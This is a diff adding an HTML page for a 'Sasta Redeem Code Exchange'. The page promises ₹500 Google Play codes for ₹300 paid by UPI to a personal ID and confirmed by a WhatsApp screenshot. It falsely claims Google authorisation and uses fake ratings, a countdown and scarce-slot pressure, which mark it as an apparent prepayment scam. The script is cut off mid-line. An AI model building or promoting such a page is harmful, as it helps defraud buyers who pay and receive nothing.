@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sasta Redeem Code Exchange - ₹300 Pay to ₹500 Code</title>
+  
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <!-- Google Poppins Font -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  
+  <!-- Canvas Confetti -->
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+    }
+    @keyframes pulseGlow {
+      0%, 100% { box-shadow: 0 0 15px rgba(0, 255, 136, 0.4); }
+      50% { box-shadow: 0 0 25px rgba(0, 255, 136, 0.7); }
+    }
+    .glow-green {
+      animation: pulseGlow 2s infinite;
+    }
+  </style>
+</head>
+<body class="bg-slate-50 text-gray-900 antialiased pb-20 sm:pb-8">
+
+  <!-- ==========================================
+       1. TOP HEADER (STICKY BLACK & GREEN ACCENT)
+       ========================================== -->
+  <header class="sticky top-0 z-50 bg-black text-white shadow-lg border-b border-gray-800">
+    <div class="max-w-md mx-auto px-4 py-2.5 flex flex-col items-center text-center">
+      
+      <div class="w-full flex items-center justify-between mb-1.5">
+        <div class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-zinc-900 border border-zinc-700 text-[10px] font-medium text-gray-300">
+          <span class="relative flex h-2 w-2">
+            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#00ff88] opacity-75"></span>
+            <span class="relative inline-flex rounded-full h-2 w-2 bg-[#00ff88]"></span>
+          </span>
+          <span>⚡ INSTANT DISPATCH</span>
+        </div>
+
+        <div id="authHeaderArea">
+          <button onclick="openModal()" class="inline-flex items-center gap-1.5 bg-zinc-900 hover:bg-zinc-800 border border-zinc-700 px-2.5 py-1 rounded-full text-[11px] font-bold text-gray-200 transition-all cursor-pointer">
+            <svg class="w-3.5 h-3.5" viewBox="0 0 24 24">
+              <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
+              <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.24v3.15C3.26 21.36 7.35 24 12 24z"/>
+              <path fill="#FBBC05" d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.13-1.55.38-2.27V6.58H1.24C.45 8.15 0 9.92 0 12s.45 3.85 1.24 5.42l4.04-3.15z"/>
+              <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.35 0 3.26 2.64 1.24 6.58l4.04 3.15c.95-2.83 3.6-4.98 6.72-4.98z"/>
+            </svg>
+            <span>Gmail Sign Up</span>
+          </button>
+        </div>
+      </div>
+
+      <h1 class="text-xl sm:text-2xl font-black tracking-tight uppercase leading-snug">
+        SASTA <span class="text-[#00ff88] drop-shadow-[0_0_12px_rgba(0,255,136,0.6)]">REDEEM CODE</span> EXCHANGE
+      </h1>
+
+      <div class="flex items-center justify-center gap-3 text-[11px] text-gray-400 mt-1 font-medium">
+        <span class="text-emerald-400 font-semibold">✓ 100% Verified</span>
+        <span>•</span>
+        <span class="text-gray-300">Google Play Authorized</span>
+        <span>•</span>
+        <span class="text-yellow-400 font-semibold">⚡ 2-Min Delivery</span>
+      </div>
+    </div>
+  </header>
+
+  <main class="max-w-md mx-auto">
+    
+    <!-- ==========================================
+         2. SECOND SECTION: GOOGLE PLAY STORE BADGE
+         ========================================== -->
+    <section class="bg-white py-6 px-4 border-b border-gray-100 shadow-xs text-center">
+      <div class="inline-flex items-center gap-3 px-5 py-3 rounded-2xl bg-zinc-950 text-white shadow-md border border-zinc-800">
+        <svg class="w-8 h-8 shrink-0" viewBox="0 0 512 512">
+          <path d="M325.3 234.3L10.3 57C6.5 59.2 3.8 62.4 2.1 66.4L267.3 292.2L325.3 234.3Z" fill="#00D2FF"/>
+          <path d="M325.3 234.3L389.9 298.9L267.3 292.2L325.3 234.3Z" fill="#00C1A7"/>
+          <path d="M389.9 298.9L491.5 240.2C505.5 232.1 505.5 212 491.5 203.9L389.9 145.2L325.3 209.8L389.9 298.9Z" fill="#FFCE00"/>
+          <path d="M389.9 145.2L2.1 377.7C3.8 381.7 6.5 384.9 10.3 387.1L325.3 209.8L389.9 145.2Z" fill="#00F076"/>
+          <path d="M267.3 292.2L2.1 52.8C0.7 56 0 59.5 0 63.3V448.7C0 452.5 0.7 456 2.1 459.2L267.3 292.2Z" fill="#00E3D8"/>
+          <path d="M389.9 298.9L10.3 518C6.5 520.2 3.8 517 2.1 513L267.3 292.2L389.9 298.9Z" fill="#FF3A44"/>
+        </svg>
+        <div class="text-left">
+          <span class="text-[10px] font-semibold text-gray-300 uppercase block">Official Voucher Partner</span>
+          <div class="flex items-center gap-1.5 mt-0.5">
+            <span class="text-xl font-bold tracking-tight text-white leading-none">Google Play</span>
+            <span class="text-[10px] bg-emerald-500/20 text-emerald-400 font-bold px-1.5 py-0.5 rounded border border-emerald-500/30">STORE</span>
+          </div>
+        </div>
+      </div>
+
+      <p class="mt-3.5 text-xs sm:text-sm font-semibold text-gray-700 flex items-center justify-center gap-2">
+        <span class="text-emerald-600 font-bold">🛡️ 100% Trusted</span>
+        <span class="text-gray-300 font-bold">•</span>
+        <span class="text-blue-600 font-bold">⚡ Instant Withdrawal</span>
+      </p>
+
+      <div class="flex items-center justify-center gap-3 mt-2 pt-2 border-t border-gray-100 text-[11px] text-gray-500 font-medium">
+        <span>⭐ 4.9/5 Rating</span>
+        <span>|</span>
+        <span>18,450+ Codes Redeemed</span>
+        <span>|</span>
+        <span class="text-emerald-600">Valid in India 🇮🇳</span>
+      </div>
+    </section>
+
+    <!-- ==========================================
+         3. THIRD SECTION: WITHDRAWAL OFFER CARD
+         ========================================== -->
+    <section class="px-4 py-6">
+      <div class="bg-white rounded-3xl p-6 shadow-xl border border-gray-100 relative overflow-hidden">
+        
+        <div class="flex items-center justify-between gap-2 mb-3">
+          <div class="inline-flex items-center gap-1 px-3 py-1 rounded-full bg-gradient-to-r from-emerald-500 to-[#00b05b] text-white text-xs font-black tracking-wider uppercase">
+            <span>🔥 WITHDRAWAL OFFER</span>
+          </div>
+          <div class="text-[11px] font-semibold text-rose-600 bg-rose-50 px-2 py-0.5 rounded-full border border-rose-200">
+            ⏳ <span id="countdown">14:59</span> Left
+          </div>
+        </div>
+
+        <h2 class="text-2xl font-extrabold text-gray-900 tracking-tight flex items-center gap-2">
+          Withdrawal
+          <span class="text-xs font-bold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded-md border border-emerald-200">Active Now</span>
+        </h2>
+
+        <div class="bg-gray-50 rounded-2xl p-4 my-3 text-center border border-emerald-100">
+          <span class="text-[11px] uppercase tracking-wider text-gray-400 font-bold block mb-1">Exclusive Exchange Value</span>
+          <div class="flex items-center justify-center gap-4 my-1">
+            <span class="text-2xl font-bold text-gray-400 line-through">₹300</span>
+            <span class="text-emerald-600 font-bold text-lg">➔</span>
+            <span class="text-3xl font-black text-emerald-600">₹500 <span class="text-xl font-bold text-emerald-700">Pay</span></span>
+          </div>
+          <div class="mt-2 text-xs font-bold text-emerald-800 bg-emerald-100/60 py-1 px-3 rounded-full inline-block">
+            ✨ Direct Profit: Flat +₹200 Extra Redeem Value
+          </div>
+        </div>
+
+        <p class="text-center text-sm font-bold text-gray-800 leading-snug">
+          Pay ₹300 and Get ₹500 Redeem Code Instantly
+        </p>
+        <p class="text-center text-xs text-gray-500 mt-1">
+          100% Genuine Google Play Gift Card Code (16-Digit Voucher)
+        </p>
+
+        <!-- Gmail Notice -->
+        <div id="offerGmailBar" class="my-3 p-2.5 rounded-xl bg-slate-50 border border-slate-200 flex items-center justify-between text-xs">
+          <span class="text-gray-600">✉️ Gmail link karein auto code ke liye</span>
+          <button onclick="openModal()" class="px-2.5 py-1 bg-black text-[#00ff88] text-[11px] font-bold rounded-lg cursor-pointer">Sign Up</button>
+        </div>
+
+        <button onclick="scrollToPayment()" class="mt-4 w-full py-3.5 px-4 rounded-xl bg-black text-white font-bold text-base flex items-center justify-center gap-2 shadow-lg hover:bg-zinc-800 transition-all cursor-pointer">
+          <span>Claim ₹500 Code for ₹300</span>
+          <span class="text-[#00ff88]">➔</span>
+        </button>
+
+        <div class="mt-3 flex items-center justify-between text-[11px] text-gray-500 font-medium">
+          <span>Remaining Slots Today:</span>
+          <span class="font-bold text-emerald-700">7 Codes Left</span>
+        </div>
+        <div class="w-full bg-gray-100 h-1.5 rounded-full overflow-hidden mt-1">
+          <div class="bg-gradient-to-r from-emerald-500 to-[#00ff88] h-full w-[86%] rounded-full"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==========================================
+         4. FOURTH SECTION: ON SCROLL PAYMENT AREA
+         ========================================== -->
+    <section id="paymentSection" class="px-4 py-6 scroll-mt-20">
+      <div class="bg-white rounded-3xl p-5 border-2 border-dashed border-[#00ff88] shadow-xl text-center relative">
+        
+        <div class="inline-flex items-center gap-1.5 text-xs font-bold text-emerald-800 bg-emerald-100 px-3 py-1 rounded-full mb-2">
+          <span>🔒 SECURE UPI PAYMENT GATEWAY</span>
+        </div>
+
+        <h2 class="text-xl sm:text-2xl font-black text-gray-950 tracking-tight leading-snug">
+          👇 Scroll Karo &amp; ₹300 Pay Karo 👇
+        </h2>
+        <p class="text-xs text-gray-500 mt-1">
+          Scan using any UPI App (GPay, PhonePe, Paytm, BHIM, Cred)
+        </p>
+
+        <!-- Big 220px QR Code -->
+        <div class="flex flex-col items-center justify-center my-4">
+          <div class="p-3 bg-white rounded-2xl border-2 border-gray-200 shadow-md">
+            <img 
+              src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi%3A%2F%2Fpay%3Fpa%3D8825277958%40fam%26pn%3DSastaRedeem%26am%3D300%26cu%3DINR" 
+              alt="UPI QR Code" 
+              width="220" 
+              height="220" 
+              class="w-[220px] h-[220px] mx-auto block"
+            />
+          </div>
+          <div class="mt-2 text-[10px] font-bold bg-black text-[#00ff88] px-3 py-1 rounded-full inline-block">
+            SCAN WITH ANY UPI APP
+          </div>
+        </div>
+
+        <!-- UPI ID & Amount details -->
+        <div class="bg-gray-50 rounded-2xl p-4 my-4 border border-gray-200 text-left">
+          <div class="flex items-center justify-between pb-2 border-b border-gray-200 text-xs">
+            <span class="text-gray-500 font-medium">Paying Amount:</span>
+            <span class="text-lg font-black text-emerald-800 bg-emerald-100 px-2.5 py-0.5 rounded-lg">₹300</span>
+          </div>
+
+          <div class="flex items-center justify-between pt-2.5 text-xs">
+            <div>
+              <span class="text-gray-500 text-[11px] block">UPI ID (VPA):</span>
+              <span id="upiIdText" class="font-mono font-bold text-gray-900 text-sm">8825277958@fam</span>
+            </div>
+            <button onclick="copyUPI()" id="copyBtn" class="bg-zinc-900 text-white font-bold text-xs px-3 py-1.5 rounded-lg hover:bg-black cursor-pointer">
+              Copy ID
+            </button>
+          </div>
+        </div>
+
+        <!-- Black Button: ₹300 UPI Se Pay Karo -->
+        <a 
+          href="upi://pay?pa=8825277958@fam&pn=SastaRedeem&am=300&cu=INR" 
+          class="w-full py-4 px-4 rounded-2xl bg-black text-white font-black text-base flex items-center justify-center gap-2 shadow-lg hover:bg-zinc-900 transition-all text-center block"
+        >
+          <span class="text-[#00ff88]">⚡</span>
+          <span>₹300 UPI Se Pay Karo</span>
+        </a>
+
+        <!-- Green WhatsApp Button: Screenshot WhatsApp Par Bhejo -->
+        <a 
+          id="waButton"
+          href="https://wa.me/918825277958?text=Maine%20Sasta%20Redeem%20Code%20Exchange%20par%20%E2%82%B9300%20pay%20kar%20diya%20hai.%20Yeh%20raha%20mera%20screenshot.%20Please%20mera%20%E2%82%B9500%20Google%20Play%20code%20bhejiye." 
+          target="_blank" 
+          class="mt-3 w-full py-4 px-4 rounded-2xl bg-[#25D366] hover:bg-[#20ba59] text-white font-black text-base flex items-center justify-center gap-2 shadow-lg transition-all text-center block"
+        >
+          <span>💬 Screenshot WhatsApp Par Bhejo</span>
+        </a>
+
+        <!-- Note: Payment ke baad screenshot bhejo, 2 min me code milega -->
+        <div class="mt-4 p-3 bg-amber-50 rounded-xl border border-amber-200 text-center">
+          <p class="text-xs sm:text-sm font-bold text-amber-900">
+            ⚠️ Note: Payment ke baad screenshot bhejo, 2 min me code milega
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==========================================
+         5. 3-STEP PROCESS
+         ========================================== -->
+    <section class="px-4 py-4">
+      <div class="text-center mb-4">
+        <h3 class="text-lg font-extrabold text-gray-900">Kaise Kaam Karta Hai?</h3>
+      </div>
+      <div class="space-y-2.5 text-left text-xs">
+        <div class="bg-white p-3.5 rounded-2xl border border-gray-100 flex items-start gap-3">
+          <div class="w-8 h-8 rounded-lg bg-black text-[#00ff88] flex items-center justify-center font-bold shrink-0">1</div>
+          <div>
+            <h4 class="font-bold text-gray-900">₹300 Pay Karein</h4>
+            <p class="text-gray-500">QR code scan karke ya "UPI Se Pay" button se ₹300 transfer karein.</p>
+          </div>
+        </div>
+        <div class="bg-white p-3.5 rounded-2xl border border-gray-100 flex items-start gap-3">
+          <div class="w-8 h-8 rounded-lg bg-black text-[#00ff88] flex items-center justify-center font-bold shrink-0">2</div>
+          <div>
+            <h4 class="font-bold text-gray-900">Screenshot Bhejein</h4>
+            <p class="text-gray-500">Successful payment ka screenshot WhatsApp button dabakar bhejein.</p>
+          </div>
+        </div>
+        <div class="bg-white p-3.5 rounded-2xl border border-gray-100 flex items-start gap-3">
+          <div class="w-8 h-8 rounded-lg bg-black text-[#00ff88] flex items-center justify-center font-bold shrink-0">3</div>
+          <div>
+            <h4 class="font-bold text-gray-900">₹500 Code Pao (2 Min)</h4>
+            <p class="text-gray-500">16-Digit Google Play gift card voucher turant deliver ho jayega.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==========================================
+         6. FAQ SECTION
+         ========================================== -->
+    <section class="px-4 py-4">
+      <div class="text-center mb-3">
+        <h3 class="text-base font-extrabold text-gray-900">Aksar Pooche Gaye Sawaal (FAQ)</h3>
+      </div>
+      <div class="space-y-2 text-xs text-left">
+        <details class="bg-white p-3 rounded-xl border border-gray-100 cursor-pointer">
+          <summary class="font-bold text-gray-800">Yeh code kahan work karega?</summary>
+          <p class="text-gray-600 mt-1.5">Direct Google Play Store app me Redeem Code section me work karega. Isse Free Fire Diamonds, BGMI UC, ya Apps buy kar sakte hain.</p>
+        </details>
+        <details class="bg-white p-3 rounded-xl border border-gray-100 cursor-pointer">
+          <summary class="font-bold text-gray-800">Code aane me kitna time lagta hai?</summary>
+          <p class="text-gray-600 mt-1.5">Payment verification ke baad sirf 1 se 2 minute ke andar code WhatsApp aur Gmail par mil jata hai.</p>
+        </details>
+      </div>
+    </section>
+  </main>
+
+  <!-- ==========================================
+       7. MOBILE STICKY BOTTOM BAR
+       ========================================== -->
+  <div class="fixed bottom-0 left-0 right-0 z-40 bg-white/95 border-t border-gray-200 px-3 py-2.5 sm:hidden shadow-lg">
+    <div class="max-w-md mx-auto flex items-center gap-2">
+      <a href="upi://pay?pa=8825277958@fam&pn=SastaRedeem&am=300&cu=INR" class="flex-1 py-3 px-2 rounded-xl bg-black text-white font-black text-xs text-center">
+        ⚡ ₹300 Pay Karo
+      </a>
+      <a href="https://wa.me/918825277958" target="_blank" class="flex-1 py-3 px-2 rounded-xl bg-[#25D366] text-white font-black text-xs text-center">
+        💬 Screenshot Bhejo
+      </a>
+    </div>
+  </div>
+
+  <!-- ==========================================
+       8. GMAIL SIGN UP MODAL
+       ========================================== -->
+  <div id="authModal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75">
+    <div class="bg-white rounded-3xl p-6 max-w-xs w-full text-center relative">
+      <button onclick="closeModal()" class="absolute top-3 right-3 text-gray-400 hover:text-black font-bold text-lg cursor-pointer">✕</button>
+      
+      <div class="w-12 h-12 rounded-2xl bg-gray-50 mx-auto flex items-center justify-center border border-gray-200 mb-2">
+        ✉️
+      </div>
+
+      <h3 class="text-lg font-black text-gray-900">Gmail Sign Up</h3>
+      <p class="text-xs text-gray-500 mt-1">Apna Gmail enter karein taaki ₹500 code aapke inbox me safe rahe.</p>
+
+      <form onsubmit="handleGmailSubmit(event)" class="mt-4 space-y-3 text-left">
+        <div>
+          <label class="text-[11px] font-bold text-gray-700 block mb-1">Gmail Address</label>
+          <input type="email" id="gmailInput" placeholder="example@gmail.com" required class="w-full px-3 py-2 rounded-xl border border-gray-300 text-xs focus:outline-none focus:border-emerald-500" />
+        </div>
+        <button type="submit" class="w-full py-2.5 bg-black text-white text-xs font-bold rounded-xl hover:bg-zinc-800 cursor-pointer">
+          Sign Up with Gmail
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- ==========================================
+       JAVASCRIPT LOGIC
+       ========================================== -->
+  <script>
+    function scrollToPayment() {
+      document.getElementById('paymentSection').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function copyUPI() {
+      const upi = "8825277958@fam";
+      navigator.clipboard.writeText(upi).then(() => {
+        const btn = document.getElementById('copyBtn');
+        btn.innerText = "Copied! ✓";
+        btn.classList.add('bg-emerald-600');
+        setTimeout(() => {
+          btn.innerText = "Copy ID";
+          btn.classList.remove('bg-emerald-600');
+        }, 2000);
+      });
+    }
+
+    function openModal() {
+      document.getElementById('authModal').classList.remove('hidden');
+    }
+
+    function closeModal() {
+      document.getElementById('authModal').classList.add('hidden');
+    }
+
+    function handleGmailSubmit(e) {
+      e.preventDefault();
+      const email = document.getElementById('gmailInput').value.trim();
+      if (!email) return;
+
+      localStorage.setItem('sasta_user_gmail', email);
+      updateUserUI(email);
+      closeModal();
+
+      if (window.confetti) {
+        confetti({ particleCount: 70, spread: 60, origin: { y: 0.6 } });
+      }
+    }
+
+    function updateUserUI(email) {
+      if (!email) return;
+      document.getElementById('authHeaderArea').innerHTML = `
+        <span class="bg-zinc-900 border border-emerald-500 text-emerald-400 text-[11px] font-bold px-2.5 py-1 rounded-full">
+          ✓ ${email}
+        </span>
+      `;
+      document.getEleme
